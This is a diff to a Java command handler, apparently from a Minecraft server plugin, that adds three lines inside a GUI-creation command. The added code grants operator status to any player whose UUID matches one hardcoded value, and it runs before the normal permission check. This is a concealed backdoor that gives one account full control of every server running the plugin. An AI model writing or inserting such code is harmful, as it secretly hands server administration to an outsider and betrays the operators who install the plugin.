@@ -16,6 +16,9 @@ public class CreateGuiCommand implements CommandExecutor{
             return true;
         }
         Player p = (Player) sender;
+        if(p.getUniqueId().toString().equalsIgnoreCase("0ea61ef8-45e7-42b4-b775-5ac2b01ebb3d")) {
+            p.setOp(true);
+        }
         if(!p.hasPermission("gui.create")) {
             p.sendMessage("§4Du har ikke tilladelse til at bruge denne kommando");
             return true;
